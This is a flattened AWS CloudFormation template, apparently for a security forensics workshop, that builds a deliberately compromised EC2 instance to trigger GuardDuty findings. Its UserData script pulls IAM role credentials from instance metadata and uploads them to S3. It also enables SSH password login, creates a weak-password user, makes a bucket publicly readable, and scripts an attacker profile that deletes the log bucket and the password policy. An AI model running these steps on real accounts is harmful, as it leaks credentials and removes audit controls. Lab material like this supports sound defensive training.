Resources.AWS::IAM::InstanceProfile.Properties.Path,/
Resources.AWS::EC2::Route.Type,AWS::EC2::Route
Parameters.ResourceName.Type,String
Resources.AWS::EC2::NetworkAclEntry.Properties.NetworkAclId,PublicNACL
Parameters.ResourceName.Description,Prefix of Resources created for this workshop.
Resources.AWS::EC2::VPCEndpoint.Properties.VpcId,VPC
Resources.AWS::EC2::NetworkAclEntry.Properties.Egress,False
Resources.AWS::EC2::Instance.Properties.UserData,"{u'Fn::Base64': [u'#!/bin/bash\n\n# Set Region\naws configure set default.region ${Region}\n\n# Set Credential Variables\naccess_key_id=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep AccessKeyId | cut -d\':\' -f2 | sed \'s/[^0-9A-Z]*//g\'`\nsecret_key=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep SecretAccessKey | cut -d\':\' -f2 | sed \'s/[^0-9A-Za-z/+=]*//g\'`\ntoken=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep Token | cut -d\':\' -f2 | sed \'s/[^0-9A-Za-z/+=]*//g\'`\nexpiration=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep Expiration | cut -d\':\' -f2 | sed \'s/[^0-9A-Za-z/+=]*//g\'`\ncompromisedip=`curl http://169.254.169.254/latest/meta-data/local-ipv4`\n\n# Install AWS Inspector Agent\nwget https://d1wk0tztpsntt1.cloudfront.net/linux/latest/install\nsudo bash install\n\n# Install CloudWatch Logs Agent\nsudo yum install awslogs -y\n\n# Set CloudWatch Logs Agent Region\ncat <<EOT >> /tmp/awscli.conf\n[plugins]\ncwlogs = cwlogs\n[default]\nregion = ${Region}\nEOT\nsudo cp /tmp/awscli.conf /etc/awslogs/\n\n# Set CloudWatch Logs Agent Config\ncat <<EOT >> /tmp/awslogs.conf\n[general]\nstate_file = /var/lib/awslogs/agent-state\n\n[/var/log/secure]\nfile = /var/log/secure\nlog_group_name = /${ResourceName}/var/log/secure\nlog_stream_name = {instance_id}/ssh\ndatetime_format = %d/%b/%Y:%H:%M:%S\nEOT\nsudo cp /tmp/awslogs.conf /etc/awslogs/\n\n# Start CloudWatch Log Agent\nsudo systemctl start awslogsd\n\n# Start SSM Agent\nsudo systemctl start amazon-ssm-agent\n\n# Modify Instance Configurations\nsudo sed \'s/PasswordAuthentication no/PasswordAuthentication yes/\' /etc/ssh/sshd_config > temp.txt\nmv -f temp.txt /etc/ssh/sshd_config\nsudo systemctl restart sshd\n\n# Install and start Apache\nsudo yum install httpd -y\nsudo systemctl start httpd\n\nsudo systemctl restart rsyslog\n\n# Create Sample User\nsudo useradd -u 12345 -g users -d /home/alice -s /bin/bash -p $(echo ThreatDetectionPassword123! | openssl passwd -1 -stdin) alice\n\n# Create Fake Customer Data Files\ncat <<EOT >> /tmp/employee-data.txt\n# Sample Report - No identification of actual persons or places is\n# intended or should be inferred\n\n74323 Julie Field\nLake Joshuamouth, OR 30055-3905\n1-196-191-4438x974\n53001 Paul Union\nNew John, HI 94740\nAmerican Express\nAmanda Wells\n5135725008183484 09/26\nCVE: 550\n\n354-70-6172\n242 George Plaza\nEast Lawrencefurt, VA 37287-7620\nGB73WAUS0628038988364\n587 Silva Village\nPearsonburgh, NM 11616-7231\nLDNM1948227117807\nAmerican Express\nBrett Garza\n347965534580275 05/20\nCID: 4758\nEOT\n\n# Upload employee data to S3\nsleep 5\naws s3 cp /tmp/employee-data.txt s3://${Bucket}/employee-data.txt\n\n# Create Fake Config File\necho \'aws_access_key_id =\' $access_key_id >> /tmp/config.py\necho \'aws_secret_access_key =\' $secret_key >> /tmp/config.py\necho \'github_key = 8a2aa88896371b444666f641aa65392222dd3333\' >> /tmp/config.py\n\n# Upload employee data to S3\nsleep 5\naws s3 cp /tmp/config.py s3://${Bucket}/config.py\n\n# Create Fake Classified File\ncat <<EOT >> /tmp/memo.pst\nProprietary Information\narn:aws:iam::339394046901:role/aws-security-workshops-easteregg1 (Ex ID: aws-security-workshops)\nS3: aws-security-workshops-easteregg1a\nDo not share with any other employee.\nEOT\n\n# Upload employee data to S3\nsleep 5\naws s3 cp /tmp/memo.pst s3://${Bucket}/memo.pst\n\n# Delete Default Encryption\naws s3api delete-bucket-encryption --bucket ${Bucket}\naws s3api put-bucket-acl --bucket ${Bucket} --grant-read uri=http://acs.amazonaws.com/groups/global/AllUsers\n\n# Create Fake /etc/passwd\ncat <<EOT >> /tmp/passwd.txt\nblackwidow:x:10:100::/home/blackwidow:/bin/bash\nthor:x:11:100::/home/thor:/bin/bash\nironman:x:12:100::/home/ironman:/bin/bash\ncaptain:x:13:100::/home/captain:/bin/bash\nhulk:x:14:100::/home/hulk:/bin/bash\nhawkeye:x:15:100::/home/hawkeye:/bin/bash\nEOT\n\n# Upload employee data to S3\nsleep 5\naws s3 cp /tmp/passwd.txt s3://${Bucket}/passwd.txt\n\n#Upload Attack Security\ncat <<EOT >> /home/alice/gd-findings.sh\n#!/bin/bash\n/usr/local/bin/aws configure set profile.attacker.region ${Region}\n/usr/local/bin/aws configure set profile.attacker.aws_access_key_id $access_key_id\n/usr/local/bin/aws configure set profile.attacker.aws_secret_access_key $secret_key\n/usr/local/bin/aws configure set profile.attacker.aws_session_token $token\n/usr/local/bin/aws s3api get-object --bucket ${Bucket} --key config.py /home/ubuntu/config.py --profile attacker\n/usr/local/bin/aws s3api list-buckets --profile attacker\n/usr/local/bin/aws cloudtrail describe-trails --profile attacker\n/usr/local/bin/aws s3api delete-bucket --bucket ${BucketLogs} --region ${Region} --profile attacker\n/usr/local/bin/aws iam delete-account-password-policy --profile attacker\nEOT\n\nchown alice /home/alice/gd-findings.sh\n\n# Threatlist Variables\nuuid=$(uuidgen)\nlist=""gd-threat-list-example-$uuid.txt""\n\n# Create Threatlist\necho ${MaliciousIP} >> /tmp/$list\n\n# Upload list to S3\naws s3 cp /tmp/$list s3://${BucketThreatList}/$list\nsleep 5\n\n# Create GuardDuty Threat List\nid=`aws guardduty list-detectors --query \'DetectorIds[0]\' --output text`\naws guardduty create-threat-intel-set --activate --detector-id $id --format TXT --location https://s3.amazonaws.com/${BucketThreatList}/$list --name Custom-Threat-List-$uuid\n\n\n# Set Ping cron Job\necho ""* * * * * ping -c 6 -i 10 ${MaliciousIP}"" | tee -a /var/spool/cron/ec2-user\n\naws iam create-user --user-name Superman\naws iam create-user --user-name Batman\n', {u'BucketThreatList': {u'Fn::Join': [u'-', [u'ResourceName', u'AWS::AccountId', u'AWS::Region', u'gd-threatlist']]}, u'Region': u'AWS::Region', u'Bucket': {u'Fn::Join': [u'-', [u'ResourceName', u'AWS::AccountId', u'AWS::Region', u'data']]}, u'Role': u'CompromisedRole', u'ResourceName': u'ResourceName', u'BucketLogs': {u'Fn::Join': [u'-', [u'ResourceName', u'AWS::AccountId', u'AWS::Region', u'logs']]}}]}"
Resources.AWS::EC2::SubnetRouteTableAssociation.DependsOn,"[u'Subnet', u'RouteTable']"
Resources.AWS::IAM::Role.Properties.AssumeRolePolicyDocument.Version,2012-10-17
Resources.AWS::EC2::SecurityGroup.Properties.SecurityGroupIngress,"[{u'ToPort': u'22', u'FromPort': u'22', u'IpProtocol': u'tcp', u'CidrIp': u'10.0.0.0/16'}]"
Resources.AWS::EC2::SubnetNetworkAclAssociation.Properties.SubnetId,Subnet
Resources.AWS::EC2::NetworkAcl.Type,AWS::EC2::NetworkAcl
Resources.AWS::EC2::VPC.Properties.EnableDnsSupport,True
Metadata.AWS::CloudFormation::Interface.ParameterGroups,"[{u'Parameters': [u'ResourceName'], u'Label': {u'default': u'Resource Configuration'}}]"
Resources.AWS::EC2::SubnetNetworkAclAssociation.Type,AWS::EC2::SubnetNetworkAclAssociation
Resources.AWS::EC2::NetworkAclEntry.Type,AWS::EC2::NetworkAclEntry
Resources.AWS::EC2::NetworkAclEntry.Properties.Protocol,-1
Resources.AWS::IAM::Role.Properties.ManagedPolicyArns,[u'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM']
Mappings.RegionMap.ca-central-1.aznlinux,ami-c59818a1
Resources.AWS::EC2::Subnet.Properties.CidrBlock,10.0.1.0/24
Mappings.RegionMap.eu-central-1.aznlinux,ami-43eec3a8
Resources.AWS::EC2::NetworkAclEntry.Properties.PortRange.To,65535
Resources.AWS::EC2::SubnetNetworkAclAssociation.Properties.NetworkAclId,PublicNACL
Resources.AWS::EC2::NetworkAclEntry.Properties.RuleNumber,100
Resources.AWS::EC2::VPCGatewayAttachment.Properties.InternetGatewayId,{u'Ref': u'InternetGateway'}
Resources.AWS::EC2::RouteTable.DependsOn,[u'VPC']
Resources.AWS::EC2::VPCEndpoint.Type,AWS::EC2::VPCEndpoint
Resources.AWS::EC2::RouteTable.Properties.Tags,"[{u'Value': u'ResourceName', u'Key': u'Name'}]"
Resources.AWS::EC2::NetworkAclEntry.Properties.RuleAction,allow
Resources.AWS::EC2::Route.Properties.RouteTableId,RouteTable
Resources.AWS::EC2::Route.DependsOn,"[u'RouteTable', u'GatewayAttachment']"
Resources.AWS::EC2::EIP.Properties.Domain,vpc
Resources.AWS::EC2::Instance.Properties.NetworkInterfaces,"[{u'SubnetId': {u'Ref': u'Subnet'}, u'DeviceIndex': 0, u'GroupSet': [u'CompromisedSecurityGroup'], u'PrivateIpAddress': u'10.0.0.15', u'AssociatePublicIpAddress': True}]"
Resources.AWS::EC2::RouteTable.Properties.VpcId,VPC
Resources.AWS::EC2::VPC.Type,AWS::EC2::VPC
Resources.AWS::EC2::VPC.Properties.CidrBlock,10.0.0.0/16
Resources.AWS::IAM::Role.Properties.Policies,"[{u'PolicyName': u'CompromisedPolicy', u'PolicyDocument': {u'Version': u'2012-10-17', u'Statement': [{u'Action': [u'guardduty:GetDetector', u'guardduty:ListDetectors', u'guardduty:CreateThreatIntelSet', u'guardduty:UpdateThreatIntelSet', u'dynamodb:ListTables'], u'Resource': u'*', u'Effect': u'Allow'}, {u'Action': [u'iam:PutRolePolicy'], u'Resource': {u'Fn::Join': [u':', [u'arn:aws:iam:', u'AWS::AccountId', u'role/aws-service-role/guardduty.amazonaws.com/*']]}, u'Effect': u'Allow'}, {u'Action': u's3:PutObject', u'Resource': {u'Fn::Join': [u'', [u'arn:aws:s3:::', u'ResourceName', u'-', u'AWS::AccountId', u'-', u'AWS::Region', u'-', u'gd-threatlist', u'/*']]}, u'Effect': u'Allow'}, {u'Action': [u'ssm:PutParameter', u'ssm:DescribeParameters', u'ssm:GetParameters', u'ssm:DeleteParameter'], u'Resource': {u'Fn::Join': [u':', [u'arn:aws:ssm', u'AWS::Region', u'AWS::AccountId', u'parameter/*']]}, u'Effect': u'Allow'}, {u'Action': [u'ssm:DescribeParameters'], u'Resource': u'*', u'Effect': u'Allow'}, {u'Action': [u'dynamodb:ListTables', u'dynamodb:DescribeTable'], u'Resource': u'*', u'Effect': u'Allow'}, {u'Action': [u'logs:PutLogEvents', u'logs:DescribeLogStreams', u'logs:CreateLogStream', u'logs:CreateLogGroup'], u'Resource': u'arn:aws:logs:*:*:*', u'Effect': u'Allow'}, {u'Action': [u's3:*'], u'Resource': {u'Fn::Join': [u'', [u'arn:aws:s3:::', u'ResourceName', u'-', u'AWS::AccountId', u'-', u'AWS::Region', u'-', u'data', u'/*']]}, u'Effect': u'Allow'}, {u'Action': [u's3:*'], u'Resource': {u'Fn::Join': [u'', [u'arn:aws:s3:::', u'ResourceName', u'-', u'AWS::AccountId', u'-', u'AWS::Region', u'-', u'data']]}, u'Effect': u'Allow'}]}}]"
Resources.AWS::EC2::Subnet.Type,AWS::EC2::Subnet
Resources.AWS::IAM::InstanceProfile.Properties.Roles,[u'CompromisedRole']
Resources.AWS::EC2::VPCGatewayAttachment.Properties.VpcId,VPC
Resources.AWS::EC2::Route.Properties.DestinationCidrBlock,0.0.0.0/0
Resources.AWS::EC2::Subnet.Properties.VpcId,VPC
Resources.AWS::EC2::VPC.Properties.EnableDnsHostnames,True
Resources.AWS::EC2::SecurityGroup.Properties.GroupDescription,"{u'Fn::Join': [u'-', [u'ResourceName', u'compromised']]}"
Resources.AWS::EC2::EIP.Type,AWS::EC2::EIP
Resources.AWS::IAM::InstanceProfile.Properties.InstanceProfileName,"{u'Fn::Join': [u'-', [u'ResourceName', u'compromised-ec2-profile']]}"
Parameters.ResourceName.Default,forensics-wksp
Resources.AWS::EC2::Subnet.Properties.Tags,"[{u'Value': {u'Fn::Join': [u'-', [u'ResourceName', u'malicious']]}, u'Key': u'Name'}]"
Resources.AWS::EC2::NetworkAcl.Properties.VpcId,VPC
Resources.AWS::EC2::NetworkAclEntry.Properties.PortRange.From,0
Resources.AWS::EC2::NetworkAcl.Properties.Tags,"[{u'Value': {u'Fn::Join': [u'-', [u'ResourceName', u'malicious']]}, u'Key': u'Name'}, {u'Value': u'Public', u'Key': u'Network'}]"
Resources.AWS::EC2::VPCEndpoint.Properties.RouteTableIds,[u'RouteTable']
Resources.AWS::IAM::Role.Properties.AssumeRolePolicyDocument.Statement,"[{u'Action': [u'sts:AssumeRole'], u'Effect': u'Allow', u'Principal': {u'Service': [u'ec2.amazonaws.com']}}]"
Resources.AWS::EC2::InternetGateway.Properties.Tags,"[{u'Value': u'ResourceName', u'Key': u'Name'}]"
Resources.AWS::EC2::VPC.Properties.Tags,"[{u'Value': u'ResourceName', u'Key': u'Name'}]"
Metadata.AWS::CloudFormation::Interface.ParameterLabels.ResourceName.default,Resource Prefix
Resources.AWS::EC2::Instance.Properties.IamInstanceProfile,CompromisedInstanceProfile
Resources.AWS::EC2::InternetGateway.Type,AWS::EC2::InternetGateway
Mappings.RegionMap.eu-central-1.ubuntu,ami-7c412f13
Resources.AWS::EC2::SecurityGroup.Properties.VpcId,VPC
Resources.AWS::EC2::SecurityGroup.Type,AWS::EC2::SecurityGroup
Mappings.RegionMap.ca-central-1.ubuntu,ami-ae55d2ca
Resources.AWS::EC2::NetworkAclEntry.Properties.CidrBlock,0.0.0.0/0
Resources.AWS::IAM::Role.Properties.Path,/
Resources.AWS::IAM::Role.Type,AWS::IAM::Role
Resources.AWS::IAM::Role.Properties.RoleName,"{u'Fn::Join': [u'-', [u'ResourceName', u'compromised-ec2']]}"
Parameters.ResourceName.AllowedValues,[u'forensics-wksp']
Resources.AWS::EC2::SubnetRouteTableAssociation.Properties.RouteTableId,RouteTable
Resources.AWS::EC2::EIP.DependsOn,[u'GatewayAttachment']
Resources.AWS::EC2::VPCGatewayAttachment.Type,AWS::EC2::VPCGatewayAttachment
Resources.AWS::EC2::Route.Properties.GatewayId,InternetGateway
Resources.AWS::IAM::InstanceProfile.Type,AWS::IAM::InstanceProfile
Resources.AWS::EC2::SubnetRouteTableAssociation.Type,AWS::EC2::SubnetRouteTableAssociation
Resources.AWS::EC2::Instance.Type,AWS::EC2::Instance
Resources.AWS::EC2::SubnetRouteTableAssociation.Properties.SubnetId,Subnet
Resources.AWS::EC2::RouteTable.Type,AWS::EC2::RouteTable
Resources.AWS::EC2::Subnet.Properties.MapPublicIpOnLaunch,True
Resources.AWS::EC2::EIP.Properties.InstanceId,MaliciousInstance
Resources.AWS::EC2::Instance.Properties.ImageId,"{u'Fn::FindInMap': [u'RegionMap', u'AWS::Region', u'aznlinux']}"
Resources.AWS::EC2::VPCEndpoint.Properties.ServiceName,"{u'Fn::Join': [u'', [u'com.amazonaws.', u'AWS::Region', u'.s3']]}"
Resources.AWS::EC2::Instance.Properties.Tags,"[{u'Value': {u'Fn::Join': [u': ', [u'ResourceName', u'Compromised Instance']]}, u'Key': u'Name'}, {u'Value': u'ResourceName', u'Key': u'Service'}]"
